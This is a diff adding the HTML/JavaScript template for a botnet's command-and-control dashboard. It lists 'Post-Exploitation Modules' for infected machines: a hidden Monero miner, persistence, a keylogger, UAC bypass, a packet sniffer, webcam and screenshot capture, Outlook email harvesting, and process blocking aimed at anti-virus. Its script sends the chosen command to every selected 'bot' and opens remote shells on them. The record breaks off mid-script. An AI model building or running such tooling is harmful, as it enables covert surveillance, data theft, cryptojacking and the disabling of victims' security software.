@@ -1,0 +1,1064 @@
+{% extends "layout.html" %}
+
+{% block slider %}
+<div class="demo-1 black-canvas" style="z-index: 0">
+	<div class="content">
+		<div id="large-header" class="large-header">
+			<canvas id="demo-canvas"></canvas>
+			<h1></h1>
+		</div>
+	</div>
+</div>
+{% endblock slider %}
+
+
+{% block main %}
+
+<div class="container" style="z-index: 1; position: absolute; top: 0; transform: translateY(-410px);">
+	
+	<h1 align="center" style="color: white;">Control Panel</h1>
+
+	<hr/>
+	<br/>
+
+		<!-- Row 1 (bulk actions, Module descriptions) -->
+		<div class="row" style="height: 460px">
+
+				<div class="tile-group" style="background-color: transparent; color: gray;">
+
+	 				<div class="tile-left" style="height: 450px;">
+
+
+						<div class="panel panel-dark">
+							<div class="panel-heading">
+								<div class="panel-title" id="bulk-actions">Post-Exploitation Modules</div>
+							</div>
+
+							<div class="panel-body">
+
+								<div class="form-group" align="left">
+									<select required class="selectboxit" data-first-option="false" id="module" name="module" style="overflow: visible;">
+										<option>Select module</option>
+										<option value="miner">Miner</option>
+										<option value="persistence">Persistence</option>
+										<option value="keylogger">Keylogger</option>
+										<option value="escalate">Escalate Privileges</option>
+										<option value="packetsniffer">Packet Sniffer</option>
+										<option value="screenshot">Screenshot</option>
+										<option value="webcam">Webcam</option>
+										<option value="outlook">Outlook Emails</option>
+										<option value="icloud">iCloud</option>
+										<option value="portscanner">Port Scanner</option>
+										<option value="process">Process Control</option>
+									</select>
+
+									<div id="module-description" style="padding-top: 10px">Module usage information </strong>will appear here.</div>
+
+								 	<ul name="module-info" id="module-info" align="left">
+<!-- 								 		{% if not sessions %}
+									 		<li>
+										 		<a href="{{ url_for('main.payloads') }}" class="module-panel-link" style="font-weight: bold;">Generate a payload</a> and run it on the target system to create a bot.
+											</li>	 			
+									  		<li>
+									 			Check out our <a href="{{ url_for('main.guide') }}" class="module-panel-link">getting started guide</a> to get started in minutes.
+									 		</li>
+									 		<li>
+									 			Need help? Check out the <a href="{{ url_for('main.faq') }}" class="module-panel-link">FAQ</a> section.</a> 
+									 		</li>
+								 		{% endif %} -->
+								 	</ul>
+
+									<div id="module-platforms"></div>
+
+									<!-- Miner  Options -->
+									<div class="input-group" name="miner" id="miner">
+
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="miner-rd-run" name="radio1" onclick="updateModule();">
+											<label>Run</label>
+										</div>
+										
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="miner-rd-stop" name="radio1" onclick="updateModule();">
+											<label>Stop</label>
+										</div>
+
+									  	<input class="form-control" name="miner-url" id="miner-url" placeholder="URL" type="text" required></input>
+
+									  	<input class="form-control" name="miner-port" id="miner-port" placeholder="Port" type="text" required></input>
+
+									  	<input class="form-control" name="miner-username" id="miner-username" placeholder="Wallet Address" type="text" required></input>
+
+									</div>
+
+
+									<!-- Webcam Options -->
+									<div class="input-group" name="webcam" id="webcam">
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="rd-img" name="radio1" checked>
+											<label>Image</label>
+										</div>
+										
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="rd-vid" name="radio1">
+											<label>Video</label>
+										</div>
+									</div>
+
+
+
+									<!-- Keylogger options -->
+									<div class="input-group" name="keylogger" id="keylogger">
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="keylogger-rd-run" name="radio1" checked>
+											<label>Run</label>
+										</div>
+										
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="keylogger-rd-stop" name="radio1">
+											<label>Stop</label>
+										</div>
+
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="keylogger-rd-upload" name="radio1">
+											<label>Upload</label>
+										</div>
+									</div>
+
+
+									<!-- Packetsniffer Options -->
+									<div class="input-group" name="packetsniffer" id="packetsniffer">
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="packetsniffer-rd-run" name="radio1" checked>
+											<label>Run</label>
+										</div>
+										
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="packetsniffer-rd-stop" name="radio1">
+											<label>Stop</label>
+										</div>
+
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="packetsniffer-rd-upload" name="radio1">
+											<label>Upload</label>
+										</div>
+									</div>
+
+
+									<!-- Portscanner  Options -->
+									<div class="input-group" name="portscanner" id="portscanner">
+
+									  	<input class="form-control" name="portscanner-ip" id="portscanner-ip" placeholder="Target IP" type="text" required></input>
+
+									</div>
+
+									<!-- Process Control  Options -->
+									<div class="input-group" name="process" id="process">
+
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="process-rd-block" name="radio1" checked>
+											<label>Block</label>
+										</div>
+
+										<div class="radio radio-replace" style="padding: 5px">
+											<input type="radio" id="process-rd-kill" name="radio1">
+											<label>Kill</label>
+										</div>
+
+									  	<input class="form-control" name="process-name" id="process-name" placeholder="Process Name" type="text" required></input>
+
+									</div>
+
+								<div class="row" style="padding-top: 10px">
+									<div class="col-sm-4">
+
+										<!-- Execute button -->
+										<button class="btn btn-blue entypo-play" data-loading-text="Executing..." type="submit" id="execute-button" onclick="show_loading_bar(78); executeBulkAction()" style="padding: 5px; padding-right: 10px"> Execute
+										</button>
+									</div>
+
+									<div class="col-sm-4">
+										<!-- Select All Bots -->
+										<div class="radio radio-replace" style=" padding: 5px;">
+											<input type="radio" id="select-all" name="radio2" onclick="selectAll()">
+											<label>Select All Bots</label>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+
+						</div>
+
+					</div>
+		
+					<div class="tile-right">
+		
+						<div id="map-2" class="map" style="height: 452px"></div>
+		
+					</div>
+
+			</div>
+
+		</div>
+
+		<br/>
+
+		<!-- Row 2 (sessions table) -->
+		<div class="row" style="padding-top: 20px">
+
+				<!-- Table sorting and search functions -->
+				<script type="text/javascript">
+				jQuery( document ).ready( function( $ ) {
+					var $table3 = jQuery("#sessions-table");
+					
+					var table3 = $table3.DataTable( {
+						"aLengthMenu": [[10, 25, 50, -1], [10, 25, 50, "All"]]
+					} );
+					
+					// Initalize Select Dropdown after DataTables is created
+					$table3.closest( '.dataTables_wrapper' ).find( 'select' ).select2( {
+						minimumResultsForSearch: -1
+					});
+					
+					// Apply the search
+					table3.columns().every( function () {
+						var that = this;
+					
+						$( 'input', this.header() ).on( 'keyup change', function () {
+							if ( that.search() !== this.value ) {
+								that
+									.search( this.value )
+									.draw();
+							}
+						});
+					});
+				} );
+				</script>
+
+				<!-- Action functions -->
+				<script>
+					function getTasks(element) {
+						location.href="/tasks?session_uid="+element.getAttribute('name');
+					}
+
+					function launchSession(element) {
+						location.href="/shell?session_uid="+element.getAttribute('name');
+					}
+
+					function removeSession(element) {
+						$.post("{{ url_for('session.session_remove') }}", {session_uid: element.getAttribute('name')},
+								function(response) {
+									// remove session row from table
+									$('#session-row-' + element.getAttribute('name')).remove();
+
+									// decrement bots count
+									var nbots = $('#nbots').text();
+									nbots = parseInt(nbots) - 1;
+									$('#nbots').text(nbots);
+									toastr.error('Session removed');
+								});
+					}
+				</script>
+
+
+				<!-- Poll server for new sessions -->
+				<script>
+					// remove blank space from table
+//						$('#sessions-table-body tr:first').remove();
+
+					const sleep = (milliseconds) => {
+					  return new Promise(resolve => setTimeout(resolve, milliseconds))
+					}
+
+					const pollServer = async () => {
+					  while (true) {
+					    await sleep(5000);
+						$.getJSON('/api/session/poll', function(data) {
+							try {
+								if (data.length > 0) {
+
+									for (var i = 0; i < data.length; i++) {
+
+										let session = data[i];
+
+										// Notify user of new session
+										var notification = toastr.success('New connection from ' + session.public_ip);
+
+										$(notification).click(function () { location.href='/sessions'; });
+
+										// let row = `<tr style="background-color: white; color: grey;" id="session-row-` + session.uid + `">
+
+										// 		<!-- Check box -->
+										// 		<td class="text-center">
+										// 			<div class="checkbox checkbox-replace color-blue" style="text-align: center; vertical-align: middle;">
+										// 				<input type="checkbox" id="chk-`+session.uid+`">
+										// 			</div>
+										// 		</td>
+
+										// 		<!-- Status icon -->
+										// 		<td style="text-align: center; vertical-align: middle;">
+										// 			<i class="fa fa-wifi" style="color: green; opacity: 1.0; text-align: center;" id="status-` + session.uid + `"></i>
+										// 		</td>
+
+										// 		<!-- Session ID -->
+										// 		<td style="text-align: center; vertical-align: middle;">` + session.uid + `</td>
+
+										// 		<!-- Public IP -->
+										// 		<td style="text-align: center; vertical-align: middle;">` + session.public_ip + `</td>
+
+										// 		<!-- Platform icon -->
+										// 		<td style="text-align: center; vertical-align: middle;">
+										// 			<img src="/assets/images/os/` + session.platform + `.png" width="30" height="30" style="padding-right: 5px">`;
+
+										// 		if (session.platform == 'win32') {
+										// 			row += ' Windows';
+										// 		} else if (session.platform == 'darwin') {
+										// 			row += ' OS X';
+										// 		} else {
+										// 			row += 'Linux';
+										// 		}
+
+										// 		row += `</td>
+
+										// 		<!-- Hashes/second -->
+										// 		<td id="peity-right-now-` + session.uid + `">0 H/s
+										// 		</td>
+
+										// 		<!-- Hash rate Graph -->
+										// 		<td>
+										// 			<span class="updating-chart" id="hashrate-graph-` + session.uid + `">0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0 ,0.0, 0.0,0.0, 0.0, 0.0, 0.0, 0.0</span>
+										// 		</td>
+
+										// 		<!-- Terminal button -->
+										// 		<td style="text-align: center; vertical-align: middle;">
+										// 			<button class="terminal-button" name="` + session.uid + `" onclick="launchSession(this)"><i class="fa fa-terminal terminal-icon"></i></button>
+										// 		</td>
+
+										// 		<!-- History button -->
+										// 		<td style="text-align: center; vertical-align: middle;">
+										// 			<button class="terminal-button" name="` + session.uid + `" onclick="getTasks(this)"><i class="entypo-list terminal-icon"></i></button>
+										// 		</td>
+
+										// 		<!-- Remove button -->
+										// 		<td style="text-align: center; vertical-align: middle;">
+										// 			<button class="terminal-button" name="` + session.uid + `" onclick="removeSession(this)"><i class="entypo-trash terminal-icon"></i></button>
+										// 		</td>
+										// 	</tr>`
+
+										// // Update sessions table
+										// $('#sessions-table-body tr').after(row);
+
+
+										// add peity chart
+										//$("#hashrate-graph-" + session.uid).peity("line", { width: 150});
+
+									}
+								}
+							} catch (e) {
+								console.error(e);
+							}
+						});
+					  }
+					}
+
+					//pollServer();
+				</script>
+
+
+				<!-- Sessions table -->
+				<table class="table table-bordered datatable" id="sessions-table" style="opacity: 1.0;">
+
+					<!-- Column headers -->
+					<thead>
+						<tr class="replace-inputs"">
+
+							<!-- Select button -->
+							<th style="color: black; text-align: center; vertical-align: middle;" onclick="selectVisible()">Select</th>
+
+							<!-- Status (online/offline) -->
+							<th style="color: black;"><input type="text" class="form-control" placeholder="Status" /></th>
+
+							<!-- ID -->
+							<th style="color: black;" width="10%"><input type="text" class="form-control" placeholder="ID" /></th>
+
+							<!-- IP Address -->
+							<th style="color: black;"><input type="text" class="form-control" placeholder="IP Address" /></th>
+
+							<!-- Platform -->
+							<th style="color: black;"><input type="text" class="form-control" placeholder="Platform" /></th>
+
+							<!-- Hashes/second -->
+							<th style="color: black; text-align: center; vertical-align: middle;">Hashes/Second</th>
+
+							<!-- Hashrate graph -->
+							<th style="color: black; text-align: center; vertical-align: middle;">Hashrate Graph</th>
+
+							<!-- Info buttons -->
+							<th style="color: black; text-align: center; vertical-align: middle;">Info</th>
+
+							<!-- Shell buttons -->
+							<th style="color: black; text-align: center; vertical-align: middle;">Shell</th>
+
+							<!-- Results buttons -->
+							<th style="color: black; text-align: center; vertical-align: middle;">History</th>
+
+							<!-- Kill buttons -->
+							<th style="color: black; text-align: center; vertical-align: middle;">Remove</th>
+						</tr>
+					</thead>
+					<tbody id="sessions-table-body">
+						{% for session in sessions %}
+						<tr style="background-color: white; color: grey; font-size: 14px" id="session-row-{{ session['uid'] }}">
+
+							<!-- Check box -->
+							<td style="text-align: center; vertical-align: middle;">
+								<div class="checkbox checkbox-replace color-blue">
+									<input type="checkbox" id="chk-{{ session['uid'] }}">
+								</div>
+							</td>
+
+							<!-- Status icon -->
+							<td style="text-align: center; vertical-align: middle;" width="15%">
+								{% if session['online'] %}
+									<i class="fa fa-wifi" style="color: green; text-align: center; vertical-align: middle;" id="status-{{ session['uid'] }}"></i><span id="online-{{ session['uid']}}" style="color: gray;"> Online</span>
+								{% else %}
+									<i class="fa fa-wifi" style="color: gray; text-align: center; vertical-align: middle;" id="status-{{ session['uid'] }}"></i><span style="color: gray;"> Offline</span>
+								{% endif %}
+							</td>
+
+
+							<!-- Session ID -->
+							<td style="text-align: center; vertical-align: middle;" width="10%">{{ session['id'] }}</td>
+
+							<!-- Public IP -->
+							<td id="session-{{ session['uid'] }}-ip" style="text-align: center; vertical-align: middle;" width="20%">{{ session['public_ip'] }}</td>
+
+							<!-- Platform icon -->
+							<td style="text-align: center; vertical-align: middle;" width="15%">
+								<img src="/assets/images/os/{{ session['platform'] }}.png" width="30" height="30" style="padding: 2px">
+								{% if session['platform'] == 'win32' %}
+									<!-- <i class="fa fa-windows" style="font-size: medium;">  -->Windows
+								{% elif session['platform'] == 'darwin' %}
+									<!-- <i class="fa fa-apple" style="font-size: medium;">  -->OS X
+								{% else %}
+									<!-- <i class="fa fa-linux" style="font-size: medium;"> --> Linux
+								{% endif %}
+							</td>
+
+							<!-- Hashes/second -->
+							<td id="peity-right-now-{{ session['uid'] }}">0 H/s
+							</td>
+
+							<!-- Hash rate Graph -->
+							<td>
+								<span class="updating-chart" id="hashrate-graph-{{ session['uid'] }}">0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0 ,0.0, 0.0,0.0, 0.0, 0.0, 0.0, 0.0</span>
+							</td>
+
+
+							<!-- History button -->
+							<td class="text-center">
+								<button class="terminal-button session-row-icon" name="{{ session['uid'] }}" onclick="showInfo(this)"><i class="fa fa-info-circle terminal-icon"></i></button>
+							</td>
+
+
+							<!-- Terminal button -->
+							<td class="text-center">
+								{% if session['online'] %}
+									<img class="session-row-icon" src="/assets/images/iconfinder_terminal.png" width="30" height="30" style="padding: 2px" name="{{ session['uid'] }}" onclick="launchSession(this)">
+								{% else %}
+									<img class="session-row-icon" src="/assets/images/iconfinder_terminal.png" width="30" height="30" style="padding: 2px" name="{{ session['uid'] }}" onclick="alert('Bot is offline.')">
+								{% endif %}
+							</td>
+
+							<!-- History button -->
+							<td class="text-center">
+								<button class="terminal-button session-row-icon" name="{{ session['uid'] }}" onclick="getTasks(this)"><i class="entypo-list terminal-icon"></i></button>
+							</td>
+
+							<!-- Remove button -->
+							<td class="text-center">
+								<button class="terminal-button session-row-icon" name="{{ session['uid'] }}" onclick="removeSession(this)"><i class="entypo-trash terminal-icon"></i></button>
+							</td>
+						</tr>
+						{% endfor %}
+					</tbody>
+				</table>
+
+				<!-- Client info modas -->
+				{% for session in sessions %}
+					<div class="modal fade" id="info-modal-{{ session['uid'] }}" style="height: 500px; position: absolute; top: 500px; left: 33%">
+						<div class="modal-dialog">
+							<div class="modal-content">
+								
+								<div class="modal-header">
+									<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+									<h4 class="modal-title">Bot Information</h4>
+								</div>
+								
+								<div class="modal-body">
+									<table class="table table-bordered responsive" id="info-table-{{ session['uid'] }}">
+									{% for key, value in session.items() %}
+										<tr>
+											<td><strong>{{key}}</strong></td>
+											<td>{{value}}</td>
+										</tr>
+									{% endfor %}
+									</table>
+								</div>
+								
+								<div class="modal-footer">
+									<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+								</div>
+							</div>
+						</div>
+					</div>
+				{% endfor %}
+		</div>
+
+		<br/>
+		<hr/>
+		<br/>
+
+		<div class="row" align="center">
+			<!-- Discord server -->
+				<h2 style="color: white; font-family: titillium">Need help?</h2>
+				<br/>
+				<div class="join-discord" onclick="openInNewTab('https://discord.com/channels/709150520446550097/709150520929026241');">
+					<img src="/assets/images/discord.png" style="width: 50px; padding-right: 10px"/>
+					<span>Join our Discord server</span>
+				</div>
+
+		</div>
+	</div>
+
+	<!-- Imported styles on this page -->
+	<link rel="stylesheet" href="/assets/js/datatables/datatables.css">
+	<link rel="stylesheet" href="/assets/js/select2/select2-bootstrap.css">
+	<link rel="stylesheet" href="/assets/js/select2/select2.css">
+	<link rel="stylesheet" href="/assets/js/selectboxit/jquery.selectBoxIt.css">
+
+	<!-- Bottom scripts (common) -->
+	<script src="assets/js/gsap/TweenMax.min.js"></script>
+	<script src="assets/js/jquery-ui/js/jquery-ui-1.10.3.minimal.min.js"></script>
+	<script src="assets/js/bootstrap.js"></script>
+	<script src="assets/js/joinable.js"></script>
+	<script src="assets/js/resizeable.js"></script>
+	<script src="assets/js/neon-api.js"></script>
+	<script src="/assets/js/selectboxit/jquery.selectBoxIt.min.js"></script>
+
+
+	<!-- Imported scripts on this page -->
+	<script src="assets/js/datatables/datatables.js"></script>
+	<script src="assets/js/select2/select2.min.js"></script>
+	<script src="assets/js/neon-chat.js"></script>
+
+
+	<!-- JavaScripts initializations and stuff -->
+	<script src="assets/js/neon-custom.js"></script>
+
+
+
+
+	<!-- Imported styles on this page -->
+	<link rel="stylesheet" href="/assets/js/select2/select2-bootstrap.css">
+	<link rel="stylesheet" href="/assets/js/select2/select2.css">
+	<link rel="stylesheet" href="/assets/js/selectboxit/jquery.selectBoxIt.css">
+	<link rel="stylesheet" href="/assets/js/daterangepicker/daterangepicker-bs3.css">
+	<link rel="stylesheet" href="/assets/js/icheck/skins/minimal/_all.css">
+	<link rel="stylesheet" href="/assets/js/icheck/skins/square/_all.css">
+	<link rel="stylesheet" href="/assets/js/icheck/skins/flat/_all.css">
+	<link rel="stylesheet" href="/assets/js/icheck/skins/futurico/futurico.css">
+	<link rel="stylesheet" href="/assets/js/icheck/skins/polaris/polaris.css">
+
+	<!-- Bottom scripts (common) -->
+	<script src="/assets/js/gsap/TweenMax.min.js"></script>
+	<script src="/assets/js/jquery-ui/js/jquery-ui-1.10.3.minimal.min.js"></script>
+	<script src="/assets/js/bootstrap.js"></script>
+	<script src="/assets/js/joinable.js"></script>
+	<script src="/assets/js/resizeable.js"></script>
+	<script src="/assets/js/neon-api.js"></script>
+
+
+	<!-- Imported scripts on this page -->
+	<script src="/assets/js/select2/select2.min.js"></script>
+	<script src="/assets/js/bootstrap-tagsinput.min.js"></script>
+	<script src="/assets/js/typeahead.min.js"></script>
+	<script src="/assets/js/selectboxit/jquery.selectBoxIt.min.js"></script>
+	<script src="/assets/js/bootstrap-datepicker.js"></script>
+	<script src="/assets/js/bootstrap-timepicker.min.js"></script>
+	<script src="/assets/js/bootstrap-colorpicker.min.js"></script>
+	<script src="/assets/js/moment.min.js"></script>
+	<script src="/assets/js/daterangepicker/daterangepicker.js"></script>
+	<script src="/assets/js/jquery.multi-select.js"></script>
+	<script src="/assets/js/icheck/icheck.min.js"></script>
+	<script src="/assets/js/neon-chat.js"></script>
+	<script src="/assets/js/rickshaw/vendor/d3.v3.js"></script>
+	<script src="/assets/js/rickshaw/rickshaw.min.js"></script>
+	<script src="/assets/js/raphael-min.js"></script>
+	<script src="/assets/js/morris.min.js"></script>
+	<script src="/assets/js/jquery.peity.min.js"></script>
+
+
+	<!-- JavaScripts initializations and stuff -->
+	<script src="/assets/js/neon-custom.js"></script>
+
+	<script>
+
+		function showInfo(element) {
+			var session_uid = element.getAttribute('name');
+
+			jQuery('#info-modal-' + session_uid).modal('show');
+
+			// $('#info-table-' + session_uid).slideToggle();
+		}
+
+		function updateModule() {
+			var val = $('#module').selectBoxIt().val();
+
+			// Modules with options panel
+
+			// miner
+			if (val === "miner") {
+
+				// open/close miner panel options
+				$('#miner-label').show();
+				$('#miner').show();
+
+				if ($('#miner-rd-run').is(':checked')) {
+					$('#miner-url').show();
+					$('#miner-port').show();
+					$('#miner-username').show();		
+				}
+
+				if ($('#miner-rd-stop').is(':checked')) {
+					$('#miner-url').hide();
+					$('#miner-port').hide();
+					$('#miner-username').hide();
+				}
+
+				// add module name/info
+				$('#module-name').html('Miner');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/linux2.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/darwin.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Run Monero miner in the background of the target machines.</p>`);
+				$('#module-info').html(`
+					<li><strong>URL</strong> URL of mining server</li>
+					<li><strong>Port</strong> Port of mining server</li>
+					<li><strong>Wallet Address</strong> Monero wallet address</li>`);
+
+			} else {
+				$('#miner-label').hide();
+				$('#miner').hide();
+			}
+
+			// webcam
+			if (val === "webcam") {
+				$('#webcam-label').show();
+				$('#webcam').show();
+
+				// add module name/info
+				$('#module-name').html('Webcam');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/linux2.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/darwin.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Capture images/videos from the target's webcam.</p>`);
+				$('#module-info').html(`
+					<li><strong>Image</strong> Capture an image (PNG)</li>
+					<li><strong>Video</strong> Capture a video (AVI)</li>`);
+
+			} else {
+				$('#webcam-label').hide();
+				$('#webcam').hide();
+			}
+
+			// keylogger
+			if (val === "keylogger") {
+				$('#keylogger-label').show();
+				$('#keylogger').show();
+
+				// add module name/info
+				$('#module-name').html('Keylogger');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Log the target's keystrokes</p>`);
+				$('#module-info').html(`		
+					<li><strong>Run</strong> Start running the keylogger</li>
+					<li><strong>Stop</strong> Stop running the keylogger</li>
+					<li><strong>Upload</strong> Upload the log to the server</li>`);
+			} else {
+				$('#keylogger-label').hide();
+				$('#keylogger').hide();
+			}
+
+			// packetsniffer
+			if (val === "packetsniffer") {
+				$('#packetsniffer-label').show();
+				$('#packetsniffer').show();
+
+				// add module name/info
+				$('#module-name').html('Packet Sniffer');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/linux2.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Capture the target's network traffic (Linux)</p>`);
+				$('#module-info').html(`
+					<li><strong>Run</strong> Start running the packetsniffer</li>
+					<li><strong>Stop</strong> Stop running the packetsniffer</li>
+					<li><strong>Upload</strong> Upload the log to the server</li>`);
+			} else {
+				$('#packetsniffer-label').hide();
+				$('#packetsniffer').hide();
+			}
+
+			// portscanner
+			if (val === "portscanner") {
+				$('#portscanner-label').show();
+				$('#portscanner').show();
+
+				// add module name/info
+				$('#module-name').html('Port Scanner');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/linux2.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/darwin.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Use target to scan for open ports on a target IP</p>`);
+				$('#module-info').html(`<li><strong>Target IP</strong> IP address to scan</li>`);
+			} else {
+				$('#portscanner-label').hide();
+				$('#portscanner').hide();
+			}
+
+			// process control
+			if (val === "process") {
+				$('#process-label').show();
+				$('#process').show();
+
+				// add module name/info
+				$('#module-name').html('Process Control');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Block certain processes from running on the target machines (e.g. anti-virus)</p>`);
+				$('#module-info').html(`
+					<li><strong>Block</strong> Block a process from launching/running.</li>
+					<li><strong>Block</strong> Kill a currently running process.</li>
+					<li><strong>Process Name</strong> Name of the process to target (e.g. ANTIVIRUS.EXE)</li>`);
+			} else {
+				$('#process-label').hide();
+				$('#process').hide();
+			}
+
+			// Modules without options panel
+
+			// screenshot
+			if (val === "screenshot") {
+				$('#module-name').html('Screenshot');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/linux2.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/darwin.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Capture screenshot of the target's current desktop</p>`);
+				$('#module-info').html('');
+			} else if (val === "persistence") {
+				$('#module-name').html('Persistence');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/linux2.png" width="30" height="30" style="padding: 2px">
+					<img src="/assets/images/os/darwin.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Establish persistence on target to survive through system reboot and file deletion.</p>`);
+				$('#module-info').html(`
+					<li><strong>Scheduled Task</strong> Create a scheduled task to run the payload on restart (Windows)</li>
+					<li><strong>Registry Key</strong> Add a Run Key to the registry to kick off the payload on restart (Windows)</li>
+					<li><strong>Startup File</strong> Copy the payload to startup programs to launch the payload when the system starts up (Windows)</li>
+					<li><strong>Crontab Job</strong> Create a crontab job to execute the payload on start up (Linux)</li>
+					<li><strong>Launch Agent</strong> Create a launch agent to run the payload on start up (macOS)</li>`);	
+			} else if (val === "icloud") {
+				$('#module-name').html('iCloud');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/darwin.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Check who is the currently logged in iCloud user.</p>`);
+				$('#module-info').html('');
+			} else if (val === "outlook") {
+				$('#module-name').html('Outlook');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Harvest emails from Outlook and upload them to the server.</p>`);
+				$('#module-info').html('');				
+			} else if (val === "escalate") {
+				$('#module-name').html('Escalate');
+				$('#module-platforms').html(`
+					<strong>Platforms: </strong>
+					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">`);
+				$('#module-description').html(`<p>Attempt UAC bypass to escalate privileges (Windows)</p>`);
+				$('#module-info').html('');	
+			} 
+		}
+
+		function executeBulkAction() {
+			// get module to execute
+			var action = $('#module').selectBoxIt().val();
+			var params = '';
+
+			// construct command
+			if (action === 'miner') {
+				if ($('#miner-rd-run').is(':checked')) {
+					var miner_url = $('#miner-url').selectBoxIt().val();
+					var miner_port = $('#miner-port').selectBoxIt().val();
+					var miner_username = $('#miner-username').selectBoxIt().val();
+					params += 'run ' + miner_url + ' ' + miner_port + ' ' + miner_username;
+				} else if ($('#miner-rd-stop').is(':checked')) {
+					params += 'stop';
+				}
+			} else if (action === 'persistence') {
+				params += 'add all';
+			} else if (action === 'webcam') {
+				if ($('#rd-img').is(':checked')) {
+					params += 'image';
+				} else if ($('#rd-vid').is(':checked')) {
+					params += 'video';
+				}
+			} else if (action === 'keylogger' || action == 'packetsniffer') {
+				if ($('#' + action + '-rd-run').is(':checked')) {
+					params += 'run';
+				} else if ($('#' + action + 'rd-stop').is(':checked')) {
+					params += 'stop';
+				} else if ($('#' + action + 'rd-upload').is(':checked')) {
+					params += 'upload';
+				}
+			} else if (action == 'portscanner') {
+				var portscanner_ip = $('#portscanner-ip').selectBoxIt().val();
+				params += portscanner_ip;
+			} else if (action == 'process') {
+				if ($('#' + action + '-rd-block').is(':checked')) {
+					params += 'block';
+				} else if ($('#' + action + 'rd-kill').is(':checked')) {
+					params += 'kill';
+				}
+				var process_name = $('#process-name').selectBoxIt().val();
+				params += ' ' + process_name;
+
+			}
+
+			var command = action + ' ' + params;
+
+
+			var sessions = $('[id^="chk"]');
+
+			// iterate through selected sessions
+			for (var i = 0; i < sessions.length; i++) {
+				var session = sessions[i];
+				if ($('#select-all').is(':checked') || session.checked) {
+
+					// get session uid
+					var uid = session.getAttribute('id').split('-')[1];
+
+
+					// start spinner
+					$('#status-'+i).removeClass('fa-wifi');
+					$('#status-'+i).addClass('fa-spinner');
+					$('#status-'+i).css('color','grey');
+					$('#status-'+i).addClass('fa-spin');
+
+					// send command via API
+					console.log("Sending command: '" + command + "' to session '" + uid + "'");
+
+					$.ajax({
+						url: "{{ url_for('session.session_cmd') }}", 
+						type: "POST",
+						data: {session_uid: uid, cmd: command}, 
+						ajaxI: i,
+						success: function(response) {
+                			// end spinner
+                			i = this.ajaxI;
+							$('#status-'+i).removeClass('fa-spin');
+							$('#status-'+i).removeClass('fa-spinner');
+							$('#status-'+i).addClass('fa-wifi');
+							$('#status-'+i).css('color','green');
+							toastr.success("Bot " + i + ": " + response);
+
+			            }
+			        });
+			    }
+			}
+			show_loading_bar(100);
+		}
+
+		function selectAll() {
+			var sessions = $('[id^="chk"]');
+			for (var i = 0; i < sessions.length; i++) {
+				var session = sessions[i];
+				session.click();
+			}
+		}
+	</script>
+
+	<script>
+		$(document).ready(function(){
+			// hide miner options
+			$('#miner-label').hide();
+			$('#miner').hide();
+
+			// hide webcam options
+			$('#webcam-label').hide();
+			$('#webcam').hide();
+
+			// hide keylogger options
+			$('#keylogger-label').hide();
+			$('#keylogger').hide();
+
+			// hide packetsniffer options
+			$('#packetsniffer-label').hide();			
+			$('#packetsniffer').hide();
+
+			// hide portscanner options
+			$('#portscanner-label').hide();
+			$('#portscanner').hide();
+
+			// hide process control options
+			$('#process-label').hide();
+			$('#process').hide();
+		});
+
+		$(document).ready(function(){
+			$('#module').selectBoxIt().change(function(){
+				updateModule();
+			});
+		});
+
+		$(document).ready(function(){
